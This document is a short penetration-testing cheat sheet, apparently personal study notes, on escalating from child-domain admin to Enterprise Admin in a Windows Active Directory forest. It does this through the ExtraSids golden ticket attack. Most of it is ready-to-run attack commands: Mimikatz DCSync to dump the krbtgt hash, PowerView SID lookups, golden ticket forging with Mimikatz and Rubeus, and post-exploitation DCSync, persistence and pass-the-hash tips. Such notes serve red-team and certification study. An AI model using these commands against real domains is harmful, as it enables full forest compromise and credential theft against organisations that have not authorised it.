# Attacking Domain Trusts — Child → Parent (Windows)

Prerequisite: DA in the child domain. SID filtering is not applied within the same forest, so SID history injection works cross-domain inside the forest.

Needed data:

- Child domain `krbtgt` NT hash
- Child domain SID
- Parent domain Enterprise Admins group SID
- Child domain FQDN
- Any username (doesn't need to exist)

---

## Gather the Required Data

DCSync the child domain's `krbtgt`:

```
mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
```

Get child domain SID:

```powershell
Get-DomainSID
```

Get Enterprise Admins SID from the parent domain:

```powershell
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

Enterprise Admins SID always ends in `-519`.

---

## ExtraSids Attack — Mimikatz

Forge the Golden Ticket with `/sids` pointing to Enterprise Admins in the parent domain, inject into current session with `/ptt`:

```
mimikatz # kerberos::golden /user:<FAKEUSER> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt
```

Verify ticket in memory:

```powershell
klist
```

Test parent domain access:

```powershell
ls \\<PARENT_DC_FQDN>\c$
```

---

## ExtraSids Attack — Rubeus

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /sids:<EA_SID> /user:<FAKEUSER> /ptt
```

---

## Post-Exploitation

DCSync any user in the parent domain (specify `/domain` explicitly when targeting across trust):

```
mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<USER> /domain:<PARENT_DOMAIN>
```

> [!tip] With EA rights via `/sids`, DCSync the parent `krbtgt` → Golden Ticket for the parent domain for persistence. DCSync `administrator` → PTH directly to parent DC.

> [!warning] This attack requires `SIDFilteringQuarantined: False` on the trust — the default for intra-forest trusts. Cross-forest trusts have SID filtering enabled by default and block this.